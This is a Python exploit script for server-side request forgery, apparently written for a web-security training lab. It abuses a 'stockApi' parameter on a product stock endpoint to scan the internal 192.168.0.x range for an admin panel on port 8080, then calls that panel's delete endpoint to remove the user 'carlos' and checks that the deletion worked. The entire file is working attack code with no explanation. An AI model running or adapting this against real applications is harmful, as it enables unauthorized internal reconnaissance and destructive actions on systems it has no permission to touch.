#!/bin/env /python3
import requests
import sys
import time
import urllib3
from urllib.parse import urlparse
from colorama import init ,Fore, Back, Style

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://192.168.176.1:1082', 'https': 'http://192.168.176.1:1082'}

header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'}

def find_hostname(s, url):
    check_stock = '/product/stock'
    ip_address = ''
    for i in range(1,256):
        host = 'http://192.168.0.{0}:8080/admin'.format(i)
        params = {'stockApi': host}
        req = s.post(url + check_stock, data=params, headers=header, verify=False, proxies=proxies)

        if req.status_code == 200:
            ip_address = '192.168.0.{0}'.format(i)
            break
    if ip_address == '':
        print("\033[1;31;40m[-] Could not find admin hostname.")
        sys.exit(-1)
    return ip_address


def delete_user(s, url, admin_ip):
    check_stock = '/product/stock'
    del_user_payload = 'http://{0}:8080/admin/delete?username=carlos'.format(admin_ip)
    params = {'stockApi': del_user_payload}
    req = s.post(url + check_stock, data=params, headers=header, verify=False, allow_redirects=False, proxies=proxies)

    # checke if user was deleted
    admin_panel = 'http://{}:8080/admin'.format(admin_ip)
    params2 = {'stockApi': admin_panel}
    req2 = s.post(url + check_stock, data=params2, headers=header, verify=False, proxies=proxies)

    if(req2.status_code == 200 and 'User deleted successfully!' in req2.text):
        print("\033[1;32;40m[+] Successfully deleted carlos user.")
    else:
        print("\033[1;31;40m[-] Exploit was unsuccessful")

def main():
    if len(sys.argv) != 2:
        print("\033[36m[+] Usage: {0} <url>".format(sys.argv[0]))
        print("\033[36m[+] Example: {0} https://www.bing.com".format(sys.argv[0]))
        sys.exit(-1)

    o = urlparse(sys.argv[1])
    url = o.scheme + "://" + o.hostname
	
    print("\033[36m[+] Finding admin hostname...")
    s = requests.Session()
    admin_ip = find_hostname(s, url)
    print("\033[36m[+] Found the admin ip address: {0}".format(admin_ip))
    print("\033[36m[+] Deleting carlos user...")

    delete_user(s, url, admin_ip)


if __name__ == '__main__':
    main()